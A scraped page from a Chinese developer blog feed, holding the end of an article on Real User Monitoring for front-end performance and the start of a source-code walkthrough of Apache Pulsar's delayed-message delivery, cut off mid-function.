ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">⚡️ 告别“薛定谔的 Bug”：RUM 如何精准捕获线上卡顿，让性能优化不再靠玄学？</h2>
<blockquote>
<p><strong>前端性能优化专栏 - 第二篇</strong></p>
</blockquote>
<p>在性能优化的路上，我们总会遇到一个让人抓狂的“灵异事件”：用户反馈页面卡得像幻灯片，但你在本地、在公司、在高速网络下测试，它却流畅得像德芙巧克力。</p>
<p>我们把这种现象戏称为“<strong>薛定谔的 Bug</strong>”——你打开看的时候，它就消失了。那么，如何才能打破这个魔咒，让性能优化从“玄学”变成“科学”呢？答案就是：<strong>RUM（真实用户监控）</strong> 。</p>
<h3 data-id="heading-1">⚠️ “薛定谔的 Bug”：线上卡顿但无法复现</h3>
<p>想象一下这个场景：</p>
<ol>
<li><strong>用户反馈：</strong> “你们的页面太卡了，点个按钮要等半天！”</li>
<li><strong>你测试：</strong> 刷新、点击、滚动，一切丝滑流畅，耗时不到 100ms。</li>
<li><strong>你的内心：</strong> “是不是用户手机太烂了？”</li>
</ol>
<p>这种<strong>线上卡顿，本地流畅</strong>的差异，往往让开发者陷入深深的自我怀疑。问题根源可能隐藏在<strong>资源加载、渲染或复杂的交互延迟</strong>中，而这些问题，在你的“完美”开发环境中根本无从察觉。</p>
<h3 data-id="heading-2">✨ 环境差异的根源：性能的“黑洞”</h3>
<p>为什么你的环境是“天堂”，用户的环境却是“地狱”？因为你们的<strong>环境差异</strong>太大了！</p>



































<table><thead><tr><th>差异维度</th><th>你的环境（开发/测试）</th><th>用户的环境（真实线上）</th><th>性能影响</th></tr></thead><tbody><tr><td><strong>网络条件</strong></td><td>稳定 Wi-Fi / 专线</td><td>3G/4G 切换、地铁弱信号</td><td>资源加载耗时、TTFB</td></tr><tr><td><strong>设备性能</strong></td><td>高配笔电、旗舰手机</td><td>低端手机、老旧平板</td><td>JS 执行速度、渲染速度</td></tr><tr><td><strong>浏览器版本</strong></td><td>最新 Chrome/Safari</td><td>各种版本、不同内核</td><td>API 支持、渲染机制差异</td></tr><tr><td><strong>地理位置</strong></td><td>靠近服务器的 CDN 节点</td><td>偏远地区的 CDN 节点</td><td>首字节时间（TTFB）</td></tr></tbody></table>
<p>与其在本地一遍遍地尝试“复现问题”，不如换个思路：<strong>直接去用户的“案发现场”收集证据！</strong> 这正是 <strong>RUM（Real User Monitoring）</strong> 的核心思想。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20e5487dae7942f5ba0673778cca7c91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUGluZWFwcGxlQ29kZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942635&amp;x-signature=2onk2OfnSTfr6jVqTl4ed8GeYRA%3D" alt="环境差异对比图" loading="lazy"/></p>
<h3 data-id="heading-3">🔧 什么是 RUM（真实用户监控）？</h3>
<p><strong>RUM</strong>，全称 <strong>Real User Monitoring</strong>，顾名思义，就是一套采集<strong>真实用户访问数据</strong>的监控体系。</p>
<p>它就像一个潜伏在用户浏览器中的“性能侦探”，默默地捕获并回传用户的<strong>性能指标、环境信息和异常日志</strong>。</p>
<blockquote>
<p><strong>专业名词解释：RUM</strong> 是一种<strong>被动式</strong>的性能监控方法，它通过在用户浏览器中植入一段 JavaScript 代码，来实时收集用户在页面上的各种性能数据和行为数据，并将数据上报到服务器进行分析。</p>
</blockquote>
<p><strong>RUM 的目标非常明确：</strong> 帮助开发者<strong>还原现场、定位瓶颈、验证优化效果</strong>。它将“用户说卡”这个模糊的定性描述，转化为可量化的数据指标。</p>
<h3 data-id="heading-4">🚀 RUM 的核心组成：三大法宝</h3>
<p>一个完整的 RUM 体系，通常由以下三个核心部分组成：</p>
<h4 data-id="heading-5">1. 性能数据采集：量化“卡顿”的体感</h4>
<p>“卡顿”是一种主观感受，但 RUM 能用客观指标来量化它。我们主要关注 Google 推荐的 <strong>Core Web Vitals</strong>（核心 Web 指标）以及其他关键指标：</p>









































<table><thead><tr><th>指标名称</th><th>英文缩写</th><th>衡量目标</th><th>对应“卡顿”体感</th></tr></thead><tbody><tr><td><strong>最大内容绘制</strong></td><td>LCP</td><td>页面加载速度（最大元素出现时间）</td><td>“页面白屏很久”</td></tr><tr><td><strong>首次输入延迟</strong></td><td>FID</td><td>页面交互响应速度（首次点击到响应）</td><td>“点按钮没反应”</td></tr><tr><td><strong>累积布局偏移</strong></td><td>CLS</td><td>页面视觉稳定性</td><td>“页面元素乱跳”</td></tr><tr><td><strong>首次绘制</strong></td><td>FP/FCP</td><td>页面开始渲染的时间</td><td>“页面开始有东西了”</td></tr><tr><td><strong>首字节时间</strong></td><td>TTFB</td><td>服务器响应速度</td><td>“网络慢不慢”</td></tr></tbody></table>
<p><strong>技术实现：PerformanceObserver API</strong></p>
<p>现代浏览器提供了强大的 <code>PerformanceObserver</code> API，让我们能够实时监听这些关键性能指标的变化，并将其上报。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-comment">// 收集 LCP, FID, CLS 等数据</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(entry.<span class="hljs-property">name</span>, entry.<span class="hljs-property">startTime</span>, entry.<span class="hljs-property">duration</span>)
    <span class="hljs-comment">// report(entry) // 上报到 RUM 服务器</span>
  })
})
​
<span class="hljs-comment">// 监听关键指标</span>
observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'largest-contentful-paint'</span>, <span class="hljs-string">'first-input'</span>, <span class="hljs-string">'layout-shift'</span>] })
</code></pre>
<h4 data-id="heading-6">2. 异常日志收集：捕获“意外”现场</h4>
<p>性能问题不只是慢，还包括“崩”。RUM 体系必须能捕获各种意料之外的错误，防止用户体验彻底中断。</p>
<ul>
<li><strong>JS 执行错误：</strong> 通过 <code>window.onerror</code> 捕获未被 <code>try...catch</code> 的同步错误。</li>
<li><strong>资源加载失败：</strong> 监听全局的 <code>error</code> 事件，捕获图片、CSS、JS 等资源加载失败的情况。</li>
<li><strong>Promise 未处理异常：</strong> 通过 <code>unhandledrejection</code> 捕获 Promise 链中没有 <code>catch</code> 的错误。</li>
</ul>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 捕获 JS 错误</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
  <span class="hljs-title function_">report</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'js-error'</span>, <span class="hljs-attr">message</span>: e.<span class="hljs-property">message</span> })
})
​
<span class="hljs-comment">// 捕获 Promise 异常</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'unhandledrejection'</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
  <span class="hljs-title function_">report</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'promise-rejection'</span>, <span class="hljs-attr">reason</span>: e.<span class="hljs-property">reason</span> })
})
</code></pre>
<h4 data-id="heading-7">3. 环境信息：还原用户的“案发现场”</h4>
<p>光有性能数据还不够，我们还需要知道<strong>是谁、在哪里、用什么</strong>遇到了问题。这些环境信息是数据聚合分析的关键，能帮助我们快速定位<strong>共性问题</strong>（比如“所有华为手机用户都卡顿”）。</p>
<ul>
<li>🖥️ <strong>设备信息：</strong> 设备型号、内存、屏幕分辨率。</li>
<li>⏱️ <strong>操作系统：</strong> 操作系统类型与版本（如 iOS 17.0, Android 14）。</li>
<li>🌐 <strong>浏览器信息：</strong> 浏览器类型与版本（如 Chrome 120, Safari 17）。</li>
<li>📊 <strong>网络类型：</strong> 用户的网络连接类型（如 4G, Wi-Fi）。</li>
<li>🗺️ <strong>地理位置：</strong> 用户的国家/城市，用于分析地域性 CDN 差异。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f975de70309c43ee99cb7b6e620c50ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUGluZWFwcGxlQ29kZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942635&amp;x-signature=5MTjG5FMz74DwblNb6CfjCzPc8g%3D" alt="RUM 数据流示意图" loading="lazy"/></p>
<h3 data-id="heading-8">💡 总结：让数据成为你最可靠的依据</h3>
<p>“薛定谔的 Bug”并不可怕，可怕的是我们没有工具去揭开它的面纱。</p>
<p><strong>无法复现 ≠ 无法解决。</strong></p>
<p>RUM 体系将性能优化从“凭感觉”和“靠运气”的阶段，带入了<strong>数据驱动</strong>的科学时代。建立一个系统性的 RUM 体系，让每一次“卡顿反馈”都能被精准捕获、分析和优化。</p>
<p><strong>性能优化是一场持久战，而 RUM 就是我们最可靠的雷达。</strong></p>
<hr/>
<p><strong>下一篇预告：</strong> 既然我们已经了解了 RUM 的重要性，那么下一篇我们将深入讲解 RUM 的核心采集利器——<strong>PerformanceObserver API</strong>，手把手教你如何用它来精准监控页面性能指标。敬请期待！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【pulsar】pulsar的定时发送实现原理]]></title>    <link>https://juejin.cn/post/7581741663184011299</link>    <guid>https://juejin.cn/post/7581741663184011299</guid>    <pubDate>2025-12-10T03:37:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581741663184011299" data-draft-id="7581299982671937570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【pulsar】pulsar的定时发送实现原理"/> <meta itemprop="keywords" content="后端,消息队列,开源"/> <meta itemprop="datePublished" content="2025-12-10T03:37:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sincerelyplz"/> <meta itemprop="url" content="https://juejin.cn/user/959206842703773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【pulsar】pulsar的定时发送实现原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/959206842703773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sincerelyplz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:37:22.000Z" title="Wed Dec 10 2025 03:37:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>在我们的项目中，业务中常常需要解决定时提醒，定时发布等需求，而我们会常常使用pulsar的定时消息作为我们的定时处理的方案，而pulsar天然支持定时消息的发送。Pulsar 原生支持定时消息发送，因此在有空时，我就想深入研究一下它内部是如何实现定时消息机制的，写本文的初衷就是因为好奇。</p>
<p>本文将结合源码以及图示介绍pulsar定时消息的处理流程。</p>
<h2 data-id="heading-1">结合源码分析</h2>
<p>我们首先必须要明确一个概念：<strong>pulsar的延迟消息，是延迟投递到消费者</strong>。也就是说Producer 在发送消息时立即写入 Broker ，然后存储到 BookKeeper，延迟逻辑完全发生在 Broker 的消费路径。</p>
<p>第二个概念：
我们知道，当我们订阅一个topic时，我们会在broker上存储我们的订阅信息。</p>
<p>每个 Subscription 都有自己：</p>
<ul>
<li><strong>Cursor</strong>（订阅消费指针）</li>
<li><strong>Dispatcher</strong>（调度器）</li>
<li>延迟消息调度器 <strong>DelayedDeliveryTracker</strong>（按需创建，懒加载的，下文有源码）</li>
</ul>
<p>如何发送一个消息，如果我们自己使用pursal实现一个定时发布，会写出以下代码</p>
<pre><code class="hljs language-java" lang="java">producer.newMessage()
    .deliverAfter(<span class="hljs-number">10</span>, TimeUnit.SECONDS)
    .value(data)
    .send();
</code></pre>
<p>但其实本质上是 now + 10s，计算出过期时间，然后写入消息的deliverAtTimeStamp字段上</p>
<pre><code class="hljs language-java" lang="java">  <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> TypedMessageBuilder&lt;T&gt; <span class="hljs-title function_">deliverAt</span><span class="hljs-params">(<span class="hljs-type">long</span> timestamp)</span> {
        msgMetadata.setDeliverAtTime(timestamp);
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }
</code></pre>
<p><em>源码位置：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fpulsar%2Fblob%2Fmaster%2Fpulsar-client%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fpulsar%2Fclient%2Fimpl%2FTypedMessageBuilderImpl.java" target="_blank" title="https://github.com/apache/pulsar/blob/master/pulsar-client/src/main/java/org/apache/pulsar/client/impl/TypedMessageBuilderImpl.java" ref="nofollow noopener noreferrer">github.com/apache/puls…</a></em></p>
<p>然后消息在发送的时候会去<em>checkAndStartPublish</em></p>
<p>这个代码会初始化delayedDeliveryTracker，然后将消息放到delayedDeliveryTracker里面</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">trackDelayedDelivery</span><span class="hljs-params">(<span class="hljs-type">long</span> ledgerId, <span class="hljs-type">long</span> entryId, MessageMetadata msgMetadata)</span> {
        <span class="hljs-keyword">if</span> (!topic.isDelayedDeliveryEnabled()) {
            <span class="hljs-comment">// If broker has the feature disabled, always deliver messages immediately</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            <span class="hljs-keyword">if</span> (delayedDeliveryTracker.isEmpty()) {
                <span class="hljs-keyword">if</span> (!msgMetadata.hasDeliverAtTime()) {
                    <span class="hljs-comment">// No need to initialize the tracker here</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                }

                <span class="hljs-comment">// Initialize the tracker the first time we need to use it</span>
                delayedDeliveryTracker = Optional.of(
                        topic.getBrokerService().getDelayedDeliveryTrackerFactory().newTracker(<span class="hljs-built_in">this</span>));
            }

            delayedDeliveryTracker.get().resetTickTime(topic.getDelayedDeliveryTickTimeMillis());

            <span class="hljs-comment">// 没有设置延时时间，则将延时时间设置为-1</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">deliverAtTime</span> <span class="hljs-operator">=</span> msgMetadata.hasDeliverAtTime() ? msgMetadata.getDeliverAtTime() : -<span class="hljs-number">1L</span>;
            <span class="hljs-keyword">return</span> delayedDeliveryTracker.get().addMessage(ledgerId, entryId, deliverAtTime);
        }
    }
</code></pre>
<p>那么就有一个问题了，为什么没有延时的消息也会放在<em>delayedDeliveryTracker</em> 中呢？</p>
<p>继续往下看，我们到addMessage里面</p>
<p>这个地方，我们发现如果延时消息小于0，即当前没有延时消息，或者延时消息已经过期，则不放入，返回false，回到上一层</p>
<p><em>源码位置：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fpulsar%2Fblob%2Fmaster%2Fpulsar-broker%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fpulsar%2Fbroker%2Fdelayed%2FInMemoryDelayedDeliveryTracker.java" target="_blank" title="https://github.com/apache/pulsar/blob/master/pulsar-broker/src/main/java/org/apache/pulsar/broker/delayed/InMemoryDelayedDeliveryTracker.java" ref="nofollow noopener noreferrer">github.com/apache/puls…</a></em></p>
<pre><code class="hljs language-java" lang="java"> <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">addMessage</span><span class="hljs-params">(<span class="hljs-type">long</span> ledgerId, <span class="hljs-type">long</span> entryId, <span class="hljs-type">long</span> deliverAt)</span> {
    
            <span class="hljs-comment">// 这一步判断，是否添加message(也就是ledgerId 和 entryId)到tracker</span>
        <span class="hljs-keyword">if</span> (deliverAt &lt; <span class="hljs-number">0</span> || deliverAt &lt;= getCutoffTime()) {
            messagesHaveFixedDelay = <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) {
            log.debug(<span class="hljs-string">"[{}] Add message {}:{} -- Delivery in {} ms "</span>, dispatcher.getName(), ledgerId, entryId,
                    deliverAt - clock.millis());
        }

        <span class="hljs-type">long</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> trimLowerBit(deliverAt, timestampPrecisionBitCnt);
        delayedMessageMap.computeIfAbsent(timestamp, k -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Long2ObjectRBTreeMap</span>&lt;&gt;())
                .computeIfAbsent(ledgerId, k -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Roaring64Bitmap</span>())
                .add(entryId);
        delayedMessagesCount.incrementAndGet();

        <span class="hljs-comment">// 这一步下面就是调用定时器，即时间轮</span>
        updateTimer();

        checkAndUpdateHighest(deliverAt);

        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
</code></pre>
<p>pulsar使用ledgerId + entryId定位一条消息，entryId是自增的，ledgerId是不重复的</p>
<p>接着上述方法的调用时间器的代码深入</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateTimer</span><span class="hljs-params">()</span> {

    <span class="hljs-comment">// 如果当前没有任何延迟消息</span>
    <span class="hljs-keyword">if</span> (getNumberOfDelayedMessages() == <span class="hljs-number">0</span>) {

        <span class="hljs-comment">// 如果之前已经设置了一个 timeout（计时任务），现在不需要了，取消掉</span>
        <span class="hljs-keyword">if</span> (timeout != <span class="hljs-literal">null</span>) {
            currentTimeoutTarget = -<span class="hljs-number">1</span>;  
            timeout.cancel();          
            timeout = <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span>; 
    }

    <span class="hljs-comment">// 找到当前延迟队列中“下一条要被投递的消息”的 deliverAt 时间（最小时间戳）</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> nextDeliveryTime();

    <span class="hljs-comment">// 如果这个 timestamp 和之前设定的目标时间一样，</span>
    <span class="hljs-comment">// 说明 timer 已经为这个时间点设置好了，不需要重复调度</span>
    <span class="hljs-keyword">if</span> (timestamp == currentTimeoutTarget) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 如果之前已经设置了定时任务，但现在发现需要重新设置（如出现更早的延迟消息, 就先取消旧的 timeout</span>
    <span class="hljs-keyword">if</span> (timeout != <span class="hljs-literal">null</span>) {
        timeout.cancel();
    }

    <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> clock.millis();

    <span class="hljs-comment">// 距离目标投递时间还有多久</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">delayMillis</span> <span class="hljs-operator">=</span> timestamp - now;

    <span class="hljs-comment">// 如果 delay &lt; 0，说明消息已经到期，但仍未被发送给消费者, 所以直接return，dispatcher会处理掉</span>
    <span class="hljs-keyword">if</span> (delayMillis &lt; <span class="hljs-number">0</span>) {
